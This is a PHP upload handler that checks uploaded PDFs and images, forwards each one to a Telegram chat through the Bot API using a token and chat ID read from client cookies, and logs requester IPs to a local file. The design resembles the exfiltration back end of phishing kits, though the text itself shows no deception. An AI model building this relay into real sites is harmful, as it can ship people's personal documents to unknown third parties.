<?php
declare(strict_types=1);

error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '0');

if (!defined('UPLOAD_LOG_FILE')) {
    define('UPLOAD_LOG_FILE', __DIR__ . '/bug.txt');
}

function upload_log(string $message, array $context = []): void
{
    try {
        $entry = '[' . date('Y-m-d H:i:s') . '] ' . $message;
        if (!empty($context)) {
            $entry .= ' | ' . json_encode($context, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        }
        $entry .= PHP_EOL;
        @file_put_contents(UPLOAD_LOG_FILE, $entry, FILE_APPEND | LOCK_EX);
    } catch (Throwable $e) {
        // ignore logging failures
    }
}

function upload_json(int $code, array $payload, string $logMessage = ''): void
{
    if ($logMessage !== '' || $code >= 400) {
        upload_log($logMessage !== '' ? $logMessage : 'Response', ['code' => $code, 'payload' => $payload]);
    }
    if (!headers_sent()) {
        http_response_code($code);
        header('Content-Type: application/json; charset=utf-8');
    }
    echo json_encode($payload, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

set_error_handler(function (int $severity, string $message, string $file, int $line): bool {
    if (!(error_reporting() & $severity)) {
        return false;
    }
    upload_log('PHP error', ['severity' => $severity, 'message' => $message, 'file' => $file, 'line' => $line]);
    throw new ErrorException($message, 0, $severity, $file, $line);
});

register_shutdown_function(function (): void {
    $err = error_get_last();
    if ($err && in_array($err['type'] ?? 0, [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR, E_USER_ERROR], true)) {
        upload_log('Fatal error', $err);
        if (!headers_sent()) {
            http_response_code(500);
            header('Content-Type: application/json; charset=utf-8');
            echo json_encode(['ok' => false, 'error' => 'Server error']);
        }
    }
});

try {
    upload_log('Upload request', [
        'method' => $_SERVER['REQUEST_METHOD'] ?? '',
        'has_file' => isset($_FILES['file']),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
        'uri' => $_SERVER['REQUEST_URI'] ?? '',
    ]);

    $telegramBotToken = trim((string) ($_COOKIE['tokentel'] ?? ''));
    $telegramChatId   = trim((string) ($_COOKIE['idtel'] ?? ''));

    if ($telegramBotToken === '' || $telegramBotToken === 'Your_token_here') {
        $telegramBotToken = '';
    }
    if ($telegramChatId === '' || $telegramChatId === 'your_chatid_here') {
        $telegramChatId = '';
    }

    if ($telegramBotToken === '' || $telegramChatId === '') {
        upload_json(500, ['ok' => false, 'error' => 'Telegram token/chat_id not configured.'], 'Missing Telegram config');
    }

    if (!function_exists('curl_init')) {
        upload_json(500, ['ok' => false, 'error' => 'PHP cURL extension is not available.'], 'cURL missing');
    }

    if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
        upload_json(405, ['ok' => false, 'error' => 'Method not allowed.'], 'Invalid method');
    }

    if (!isset($_FILES['file'])) {
        upload_json(400, ['ok' => false, 'error' => 'No file uploaded (field name: file).'], 'Missing $_FILES[file]');
    }

    $file = $_FILES['file'];
    $uploadErr = (int) ($file['error'] ?? UPLOAD_ERR_NO_FILE);
    if ($uploadErr !== UPLOAD_ERR_OK) {
        upload_json(400, ['ok' => false, 'error' => 'Upload error code: ' . $uploadErr], 'Upload error code');
    }

    $tmpPath = (string) ($file['tmp_name'] ?? '');
    if ($tmpPath === '' || !is_uploaded_file($tmpPath)) {
        upload_json(400, ['ok' => false, 'error' => 'No file uploaded (field name: file).'], 'Invalid tmp upload');
    }

    $maxBytes = 10 * 1024 * 1024;
    $size = (int) ($file['size'] ?? 0);
    if ($size > $maxBytes) {
        upload_json(413, ['ok' => false, 'error' => 'File too large (max 10 MB).'], 'File too large');
    }

    $origName = (string) ($file['name'] ?? 'upload');
    $mime = '';
    if (function_exists('mime_content_type')) {
        $detected = @mime_content_type($tmpPath);
        if (is_string($detected) && $detected !== '') {
            $mime = $detected;
        }
    }
    if ($mime === '' && function_exists('finfo_open')) {
        $finfo = @finfo_open(FILEINFO_MIME_TYPE);
        if ($finfo) {
            $detected = @finfo_file($finfo, $tmpPath);
            if (is_string($detected) && $detected !== '') {
                $mime = $detected;
            }
            @finfo_close($finfo);
        }
    }
    if ($mime === '' && isset($file['type']) && is_string($file['type']) && $file['type'] !== '') {
        $mime = $file['type'];
    }
    if ($mime === '') {
        $mime = 'application/octet-stream';
    }

    $allowedMimes = [
        'application/pdf',
        'image/jpeg',
        'image/png',
        'image/webp',
        'image/gif',
    ];

    if (!in_array($mime, $allowedMimes, true)) {
        upload_json(415, ['ok' => false, 'error' => 'Unsupported file type: ' . $mime], 'Unsupported mime');
    }

    if ($mime === 'application/pdf') {
        $apiMethod = 'sendDocument';
        $fieldName = 'document';
    } else {
        $apiMethod = 'sendPhoto';
        $fieldName = 'photo';
    }

    $url = 'https://api.telegram.org/bot' . $telegramBotToken . '/' . $apiMethod;

    if (!class_exists('CURLFile')) {
        upload_json(500, ['ok' => false, 'error' => 'Server upload support unavailable (CURLFile).'], 'CURLFile missing');
    }
    $cfile = new CURLFile($tmpPath, $mime, $origName);

    $postFields = [
        'chat_id' => $telegramChatId,
        $fieldName => $cfile,
        'caption' => $origName,
    ];

    $ch = curl_init($url);
    if ($ch === false) {
        upload_json(500, ['ok' => false, 'error' => 'Failed to initialize upload request.'], 'curl_init failed');
    }

    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postFields,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_TIMEOUT => 60,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ]);
    $response = curl_exec($ch);
    $curlErr = curl_error($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if (is_resource($ch) || $ch instanceof CurlHandle) {
        curl_close($ch);
    }

    if ($response === false) {
        upload_json(502, ['ok' => false, 'error' => 'Failed to reach Telegram: ' . $curlErr], 'Telegram request failed');
    }

    $decoded = json_decode((string) $response, true);
    if ($httpCode < 200 || $httpCode >= 300 || !is_array($decoded) || empty($decoded['ok'])) {
        upload_json(502, ['ok' => false, 'error' => 'Telegram API error', 'details' => $decoded ?: $response], 'Telegram API error');
    }

    upload_log('Upload success', ['name' => $origName, 'size' => $size, 'mime' => $mime]);
    upload_json(200, ['ok' => true]);
} catch (Throwable $e) {
    upload_log('Unhandled exception', [
        'message' => $e->getMessage(),
        'file' => $e->getFile(),
        'line' => $e->getLine(),
    ]);
    upload_json(500, ['ok' => false, 'error' => 'Server error']);
}